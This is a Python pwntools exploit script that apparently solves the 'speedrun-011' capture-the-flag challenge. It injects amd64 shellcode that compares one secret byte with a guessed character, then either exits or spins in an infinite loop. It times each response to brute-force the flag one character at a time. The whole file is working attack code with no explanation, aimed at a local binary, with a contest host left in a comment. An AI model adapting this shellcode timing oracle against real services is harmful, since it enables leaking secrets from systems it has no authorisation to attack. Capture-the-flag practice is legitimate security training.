from pwn import *
import time
import os
import pwnlib.shellcraft.amd64 as sc

context.arch = 'amd64'
context.os = 'linux'
#context.log_level = 'debug'

def addplayload(index,asc) :
    tmp = asm('''
                        add dl,%d
                        xor rbx,rbx
                        xor rcx,rcx
                        mov bl,byte [rdx]
                        add cl,%d
                        cmp bl,cl
                        jz do
                        xor rax,rax
                        mov al,60
                        syscall
                    do :
                    '''%(index,asc))+asm(sc.infloop())
    #mov al,%d;add al,%d
    return tmp

def exp(index,asc) :
    p = process('./speedrun-011')
    #p = remote('speedrun-011.quals2019.oooverflow.io',31337)
    payload = addplayload(index,asc)
    p.recvuntil('Send me your vehicle\n')
    #gdb.attach(p)
    p.sendline(payload)
    start = time.time()
    p.can_recv(timeout=3)
    end = time.time()
    p.close()
    if end - start > 2 :
        #print asc
        return True
    else :
        #p.close()
        return False

def start() :
    scaii = '{}_+=-~?";:1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    flag = 'flag{'
    for i in range(5,40) :
        for j in scaii :
            try :
                print '(%d,%d)'%(i,ord(j))
                if exp(i,ord(j)) :
                    print j
                    flag += j
                    print flag
                    #raw_input('')
                    if j == '}' :
                        print flag
                        exit()
            except Exception as e :
                print e

if __name__ ==  '__main__' :
    start()
